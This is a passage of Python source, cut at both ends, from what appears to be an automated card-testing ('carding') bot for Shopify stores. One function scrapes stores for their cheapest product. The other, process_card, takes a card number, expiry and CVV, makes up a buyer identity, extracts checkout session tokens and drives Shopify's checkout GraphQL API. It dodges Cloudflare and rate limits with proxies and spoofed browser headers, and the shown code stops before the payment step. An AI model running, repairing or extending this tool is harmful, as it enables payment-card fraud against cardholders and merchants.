                print(f"[FETCH OFFLINE DB FALLBACK] {domain} variant={res_local['variant_id']} price={res_local['price']}")
                return res_local
            return None
            
        # ---------------------------------------------------

        proxy = parse_proxy(proxy_str) if proxy_str else None

        fetch_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': domain + '/',
            'sec-ch-ua': '"Microsoft Edge";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest',
        }

        DEAD_STATUSES = (401, 402, 403, 404, 410, 423, 430, 451, 500, 502, 503, 520, 521, 522, 523, 524, 525, 526)

        async def fetch_page(session, page):
            """Fetch one page of products.json. Returns list of products or None on soft error."""
            url = f"{domain}/products.json?limit=250&page={page}"
            
            async def _do_req(use_proxy):
                try:
                    px = proxy if use_proxy else None
                    async with session.get(url, headers=fetch_headers, proxy=px) as resp:
                        if resp.status == 429:
                            return None, "429 Rate Limit"
                        if resp.status in DEAD_STATUSES:
                            if resp.status in (402, 404, 401, 403, 410, 423, 451):
                                remove_site_from_simple_variants(domain)
                                try:
                                    from database import Database
                                    Database.sync_remove_working_site(domain)
                                except Exception:
                                    pass
                            return None, f"Site Error! Status: {resp.status}"
                        if resp.status != 200:
                            return None, None  # soft error — skip this page
                        text = await resp.text()
                        if "payment required" in text.lower() or "402 payment required" in text.lower():
                            remove_site_from_simple_variants(domain)
                            try:
                                from database import Database
                                Database.sync_remove_working_site(domain)
                            except Exception:
                                pass
                            return None, "Site Error! Status: 402 (Payment Required)"
                        if page == 1 and "shopify" not in text.lower():
                            return None, "Not Shopify"
                        try:
                            products = json.loads(text).get('products', [])
                            return products, None
                        except Exception:
                            return None, None
                except aiohttp.ClientProxyConnectionError as e:
                    return None, f"Cannot connect to proxy: {str(e)}"
                except aiohttp.ServerDisconnectedError:
                    return None, f"Site Error! Status: 0"
                except aiohttp.ServerConnectionError as e:
                    err_str = str(e)
                    if 'proxy' in err_str.lower() or 'tunnel' in err_str.lower():
                        return None, f"Cannot connect to proxy: {err_str}"
                    return None, f"Site Error! Status: 0"
                except aiohttp.ClientResponseError as e:
                    return None, f"Site Error! Status: {e.status}"
                except Exception as e:
                    err_str = str(e)
                    if any(x in err_str.lower() for x in ['proxy', 'cannot connect to host', 'proxyerror', 'tunnel']):
                        return None, f"Cannot connect to proxy: {err_str}"
                    if 'server disconnected' in err_str.lower():
                        return None, f"Site Error! Status: 0"
                    if ", message=''" in err_str or "message=''" in err_str:
                        import re as _re
                        m = _re.match(r'^(\d+),', err_str.strip())
                        status = m.group(1) if m else "0"
                        return None, f"Site Error! Status: {status}"
                    return None, None  # soft error

            # Try WITHOUT proxy first
            res, err = await _do_req(False)
            # If direct fails with an error OR a 429, fall back to proxy
            if (err is not None and ('429' in err or 'Site Error' in err or 'Status: 0' in err)) or (res is None and err is None):
                # Fall back to PROXY only if proxy is configured
                if proxy:
                    print(f"[FETCH FALLBACK] Direct fetch failed on {domain}. Retrying with proxy...")
                    res, err = await _do_req(True)
            return res, err

        last_error = None
        all_products = []

        for fetch_attempt in range(3):  # reduced from 5 — deep fetch covers more ground
            if fetch_attempt > 0:
                delay_before = 0.3 + (fetch_attempt * 0.3)
                print(f'[FETCH] {domain} waiting {delay_before}s before retry {fetch_attempt+1}/3')
                await asyncio.sleep(delay_before)

            try:
                timeout_val = 20 + (fetch_attempt * 5)
                connector = aiohttp.TCPConnector(ssl=False)
                timeout = aiohttp.ClientTimeout(total=timeout_val)

                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    # NEW LOGIC: Try Collections HTML First to get absolute cheapest (5s timeout)
                    col_url = f"{domain}/collections/all?sort_by=price-ascending"
                    try:
                        px = proxy if proxy else None
                        async with session.get(col_url, proxy=px, timeout=aiohttp.ClientTimeout(total=8)) as col_resp:
                            if col_resp.status == 200:
                                col_text = await col_resp.text()
                                import re
                                # 1. First attempt: match product cards / grid item links to avoid menu/header links
                                card_handles = re.findall(r'<div[^>]*class=["\'][^"\']*(?:product-block|product-card|card|grid__item)[^"\']*["\'].*?href=["\'](?:/collections/[^/]+)?/products/([^/"\?#]+)', col_text, flags=re.DOTALL)
                                if not card_handles:
                                    # 2. Second attempt: strip navigation, header, drawer, and announcement elements
                                    clean_text = re.sub(r'<(header|nav|footer)[^>]*>.*?</\1>', '', col_text, flags=re.DOTALL | re.IGNORECASE)
                                    clean_text = re.sub(r'<[^>]*(?:id|class)=["\'][^"\']*(?:navigation|menu|header|drawer|announcement)[^"\']*["\'][^>]*>.*?</(?:div|ul|nav|header)>', '', clean_text, flags=re.DOTALL | re.IGNORECASE)
                                    card_handles = re.findall(r'href=["\'](?:/collections/[^/]+)?/products/([^/"\?#]+)', clean_text)
                                if not card_handles:
                                    # 3. Fallback: all links
                                    card_handles = re.findall(r'href=["\'](?:/collections/[^/]+)?/products/([^/"\?#]+)', col_text)

                                seen = set()
                                ordered_handles = []
                                for h in card_handles:
                                    if h not in seen:
                                        seen.add(h)
                                        ordered_handles.append(h)
                                        
                                if ordered_handles:
                                    async def _fetch_js(h):
                                        try:
                                            p_u = f"{domain}/products/{h}.js"
                                            async with session.get(p_u, proxy=px, timeout=aiohttp.ClientTimeout(total=4)) as pr:
                                                if pr.status == 200:
                                                    pd = await pr.json(content_type=None)
                                                    if pd and 'variants' in pd:
                                                        for v in pd['variants']:
                                                            if 'price' in v and isinstance(v['price'], int):
                                                                v['price'] = f"{v['price'] / 100:.2f}"
                                                        return pd
                                        except Exception:
                                            pass
                                        return None

                                    js_results = await asyncio.gather(*[_fetch_js(h) for h in ordered_handles[:10]])
                                    for pd in js_results:
                                        if pd:
                                            all_products.append(pd)
                    except Exception as e:
                        pass
                    
                    if all_products:
                        print(f'[FETCH] {domain} got {len(all_products)} products via collections/all sort')
                        break
                        
                    # FALLBACK: Fetch pages 1, 2, 3 concurrently
                    tasks = [fetch_page(session, p) for p in range(1, 4)]
                    results = await asyncio.gather(*tasks, return_exceptions=False)

                    # Check page 1 result first — it's authoritative for dead-site detection
                    page1_products, page1_error = results[0]
                    if page1_error:
                        if '429' in page1_error:
                            last_error = f"error: {page1_error}"
                            if fetch_attempt < 2:
                                await asyncio.sleep(2)
                            continue
                        return False, page1_error
                    if page1_products is None:
                        last_error = f"error: fetch_products failed page 1"
                        if fetch_attempt < 2:
                            await asyncio.sleep(2)
                        continue

                    # Collect all products from all pages
                    all_products = []
                    for products, error in results:
                        if products:
                            all_products.extend(products)

                    if not all_products:
                        fb = _get_offline_fallback()
                        if fb:
                            return fb
                        last_error = "No Products found on store"
                        continue

                    print(f'[FETCH] {domain} got {len(all_products)} products across 3 pages')
                    break  # success

            except asyncio.TimeoutError:
                last_error = f"error: fetch_products timeout (attempt {fetch_attempt+1}/3)"
                print(f'[FETCH] {domain} timeout on attempt {fetch_attempt+1}/3 (timeout={timeout_val}s)')
                if fetch_attempt < 2:
                    await asyncio.sleep(2)
                continue
            except aiohttp.ClientProxyConnectionError as e:
                return False, f"Cannot connect to proxy: {str(e)}"
            except aiohttp.ClientResponseError as e:
                return False, f"Site Error! Status: {e.status}"
            except aiohttp.ServerDisconnectedError:
                print(f'[FETCH] {domain} server disconnected — blacklisting immediately')
                return False, f"Site Error! Status: 0"
            except aiohttp.ServerConnectionError as e:
                err_str = str(e)
                if 'proxy' in err_str.lower() or 'tunnel' in err_str.lower():
                    return False, f"Cannot connect to proxy: {err_str}"
                print(f'[FETCH] {domain} server connection error — blacklisting immediately: {e}')
                return False, f"Site Error! Status: 0"
            except Exception as e:
                err_str = str(e)
                if any(x in err_str.lower() for x in ['proxy', 'cannot connect to host', 'proxyerror', 'tunnel']):
                    return False, f"Cannot connect to proxy: {err_str}"
                if 'server disconnected' in err_str.lower():
                    return False, f"Site Error! Status: 0"
                if ", message=''" in err_str or "message=''" in err_str:
                    import re as _re
                    m = _re.match(r'^(\d+),', err_str.strip())
                    status = m.group(1) if m else "0"
                    return False, f"Site Error! Status: {status}"
                last_error = f"error: {err_str}"
                print(f'[FETCH] {domain} error on attempt {fetch_attempt+1}/3: {e}')
                if fetch_attempt < 2:
                    await asyncio.sleep(2)
                continue
        else:
            fb = _get_offline_fallback()
            if fb: return fb
            return False, last_error or "error: fetch_products failed after 3 attempts"

        if not all_products:
            fb = _get_offline_fallback()
            if fb: return fb
            return False, "No Products"

        import random
        valid_products = []

        # Map bucket names to actual dollar ranges (with shipping/tax buffer)
        _bucket_ranges = {"1-10": (1.0, 15.0), "11-20": (11.0, 25.0), "21-49": (21.0, 49.0)}
        if target_price_range:
            if target_price_range in _bucket_ranges:
                min_r, max_r = _bucket_ranges[target_price_range]
            elif target_price_range == "above_50":
                min_r, max_r = 50.0, float('inf')
            else:
                try:
                    parts = str(target_price_range).split('-')
                    min_r = float(parts[0])
                    max_r = float(parts[1]) if len(parts) > 1 else float('inf')
                except Exception:
                    min_r, max_r = 0.0, float('inf')
        else:
            min_r, max_r = 0.0, float('inf')

        US_COUNTRY_HINTS = {"united states", "us", "usa", "u.s.", "u.s.a."}

        def _is_us_variant(v):
            for key in ("option1", "option2", "option3"):
                val = str(v.get(key) or "").lower().strip()
                if val in US_COUNTRY_HINTS:
                    return True
            return False

        valid_products_us = []
        valid_products_any = []

        def _is_insurance_addon(prod):
            pt = (prod.get('title') or '').lower()
            ph = (prod.get('handle') or '').lower()
            ptype = (prod.get('product_type') or '').lower()
            for bad in ['route', 'shipping protection', 'navidium', 'package protection',
                        'worry-free', 'worry free', 'warranty', 'protection plan',
                        'order protection', 'insurance', 'green shipping', 'seel',
                        'care code']:
                if bad in pt or bad in ph or bad in ptype:
                    return True
            return False

        def _collect_candidates(products):
            candidates = []
            for product in products:
                if not product.get('variants'):
                    continue
                if _is_insurance_addon(product):
                    continue
                for variant in product['variants']:
                    if not variant.get('available', True):
                        continue
                    try:
                        price = variant.get('price', '0')
                        if isinstance(price, str):
                            price = float(price.replace(',', ''))
                        else:
                            price = float(price)
                        if price > 0 and price >= min_r and price <= max_r:
                            candidates.append({
                                'site': domain,
                                'price': f"{price:.2f}",
                                'variant_id': str(variant['id']),
                                'product_handle': product.get('handle', ''),
                                'link': f"{domain}/products/{product.get('handle', '')}",
                                '_is_us': _is_us_variant(variant)
                            })
                    except (ValueError, TypeError, AttributeError, KeyError):
                        continue
            return candidates

        candidates = _collect_candidates(all_products)

        if not candidates:
            # Collections page top items were only add-ons (Route/insurance).
            # Fall back to the full products.json catalogue before giving up.
            try:
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False),
                                                 timeout=aiohttp.ClientTimeout(total=20)) as s2:
                    page_results = await asyncio.gather(*[fetch_page(s2, p) for p in range(1, 4)])
                extra = [x for prods, _err in page_results if prods for x in prods]
                if extra:
                    print(f'[FETCH] {domain} collections had no valid items, products.json fallback got {len(extra)} products')
                    candidates = _collect_candidates(extra)
            except Exception as _fe:
                print(f'[FETCH] {domain} products.json fallback failed: {_fe}')

        if candidates:
            # Sort by price and pick the absolute cheapest product
            candidates.sort(key=lambda x: float(x['price']))
            cheapest_price = float(candidates[0]['price'])
            # Prefer US-specific variant only if it is within the same lowest price tier (<= cheapest + $0.50)
            us_pool = [c for c in candidates if c.get('_is_us') and float(c['price']) <= cheapest_price + 0.50]
            res = us_pool[0] if us_pool else candidates[0]
            res.pop('_is_us', None)
            _product_cache[cache_key] = (now, res)
            return res
        else:
            fb = _get_offline_fallback()
            if fb: return fb
            return False, f"No Valid Products in range {target_price_range or 'any'}"

        # Random choice handles return above


    except aiohttp.ClientError as e:
        return False, f"error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    # If message starts with "error: ", keep the prefix entirely
    if message.lower().startswith("error:"):
        return message[:200]  # Keep first 200 chars in case it's long
    
    # Strip HTML tags (e.g. <b>Site Error!</b> → Site Error!)
    message = re.sub(r'<[^>]+>', '', message).strip()
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, target_price_range=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    tag = f'[LOCAL_API] [{cc[:6]}...|{mes}|{ano}|*** @ {ourl.replace("https://","")}]'
    print(f'{tag} STEP 0: Starting checkout')
    # Removed startup sleep — was wasting 0.3s per card for no benefit
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str, target_price_range)
            if isinstance(info, tuple) and info[0] is False:
                print(f'{tag} STEP 0: fetch_products FAILED: {info[1]}')
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            # Use product price as early price estimate so high-price check
            # can fire even if checkout fails before Step 3
            total_price = info.get('price', '0.00')
            print(f'{tag} STEP 0: Got variant_id={variant_id} price={total_price}')

        connector = aiohttp.TCPConnector(ssl=False, force_close=True, enable_cleanup_closed=True)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {
                **headers,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
            print(f'{tag} STEP 1: Adding to cart...')
            cart_resp = await session.post(cart, json=cart_data, headers=cart_headers, proxy=proxy)
            
            if cart_resp.status != 200:
                cart_headers_form = {
                    **headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json, text/javascript'
                }
                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers_form, proxy=proxy)
            
            print(f'{tag} STEP 1: Cart status={cart_resp.status}')
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            print(f'{tag} STEP 2: Getting checkout page...')
            # Try HAR flow first: POST /cart with checkout= → redirects to /checkouts/cn/TOKEN
            response = await session.post(
                url=url + '/cart',
                data='checkout=',
                allow_redirects=True,
                headers={
                    **checkout_headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                proxy=proxy
            )
            checkout_url = str(response.url)
            # If HAR flow didn't land on /checkouts/cn/, fall back to direct POST /checkout/
            if '/checkouts/cn/' not in checkout_url:
                response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                checkout_url = str(response.url)
            # Last resort: GET /checkout/
            if '/checkouts/' not in checkout_url and '/checkout' not in checkout_url:
                response = await session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                checkout_url = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            
            text = await response.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            
            print(f'{tag} STEP 2: checkout_url={checkout_url[:60]} sst={bool(sst)}')
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            # Cloudflare bot challenge — proxy is flagged, rotate it
            if not sst and ('verifying your connection' in text.lower() or 'cf-browser-verification' in text.lower() or 'just a moment' in text.lower()):
                return False, "Change Proxy", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            if currency and currency != "USD" and country_code == "US":
                address_info = pick_addr(ourl, currency=currency)
                country_code = address_info["countryCode"]
                phone = address_info["phone"]
                street = address_info["address1"]
                city = address_info["city"]
                state = address_info["zoneCode"]
                s_zip = address_info["postalCode"]
            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # Extract build ID (commitSha), source token, and identification signature
            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)
            
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency
            
            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            is_digital_item = ('"requiresShipping":false' in unescaped_text or 'requiresShipping&quot;:false' in text)
            if is_digital_item:
                delivery_initial = {
                    'deliveryLines': [{
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['NONE'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }
            else:
                delivery_initial = {
                    'deliveryLines': [{
                        'destination': {
                            'partialStreetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': delivery_initial,
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        } if is_digital_item else {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'any': True} if is_digital_item else {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            print(f'{tag} STEP 3: Sending Proposal (shipping)...')
            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, tag=tag
            )
            
            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                print(f'[INVALID JSON] site={ourl} proposal step: {str(e)} | raw={resp_text[:150]}')
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, f"Checkpoint Denied", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData') or checkpoint_data
                if result.get('queueToken'):
                    queueToken = result['queueToken']
                
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
                # Dynamically update subtotal from the actual merchandise terms in proposal response
                # to prevent MERCHANDISE_EXPECTED_PRICE_MISMATCH
                try:
                    merchandise_terms = seller_proposal.get('merchandise', {})
                    print(f"{tag} STEP 3 merchandise_terms: {json.dumps(merchandise_terms)}")
                    if merchandise_terms and merchandise_terms.get('__typename') == 'FilledMerchandiseTerms':
                        lines = merchandise_terms.get('merchandiseLines', [])
                        if lines:
                            line_amount_data = lines[0].get('totalAmount', {}).get('value', {}).get('amount')
                            if line_amount_data:
                                subtotal = str(line_amount_data)
                                print(f'{tag} Dynamically updated expected subtotal to {subtotal}')
                            if lines[0].get('stableId'):
                                stableId = lines[0]['stableId']
                                print(f'{tag} Dynamically updated stableId to {stableId}')
                except Exception as e:
                    print(f'{tag} Error parsing merchandise subtotal: {str(e)}')
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            print(f'{tag} STEP 3: Proposal done. running_total={running_total} delivery_type={delivery_data.get("__typename","?") if delivery_data else "None"}')
            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')

            # If delivery terms are pending (Shopify calculating rates in background), poll until resolved
            poll_count = 0
            while (delivery_type == 'PendingTerms' or (delivery_type == 'FilledDeliveryTerms' and not delivery_data.get('deliveryLines', [{}])[0].get('availableDeliveryStrategies'))) and poll_count < 6:
                poll_count += 1
                await asyncio.sleep(0.7)
                if result.get('checkpointData'):
                    json_data['variables']['checkpointData'] = result['checkpointData']
                if result.get('queueToken'):
                    json_data['variables']['queueToken'] = result['queueToken']

                r_p, rt_p, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, tag=tag
                )
                if not r_p:
                    break
                try:
                    rj_p = json.loads(rt_p)
                    res_p = (rj_p.get('data') or {}).get('session', {}).get('negotiate', {}).get('result', {})
                    if res_p and res_p.get('sellerProposal'):
                        result = res_p
                        seller_proposal = res_p.get('sellerProposal')
                        delivery_data = seller_proposal.get('delivery') or delivery_data
                        delivery_type = delivery_data.get('__typename', '') if delivery_data else ''
                        if seller_proposal.get('runningTotal', {}).get('value', {}).get('amount'):
                            running_total = seller_proposal['runningTotal']['value']['amount']
                        if delivery_type == 'FilledDeliveryTerms':
                            strats = delivery_data.get('deliveryLines', [{}])[0].get('availableDeliveryStrategies', [])
                            if strats:
                                print(f"{tag} STEP 3: Shipping terms resolved after {poll_count} poll(s)!")
                                break
                except Exception:
                    break

            delivery_strategy = ""
            shipping_amount = 0.0
            is_shipping_required = seller_proposal.get("isShippingRequired", True)
            
            if is_digital_item or delivery_type in ("UnfilledDeliveryTerms", "UnavailableDeliveryTerms", "UnavailableTerms"):
                is_shipping_required = False

            if delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        if available_strategies[0].get("methodType") == "NONE":
                            is_shipping_required = False
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
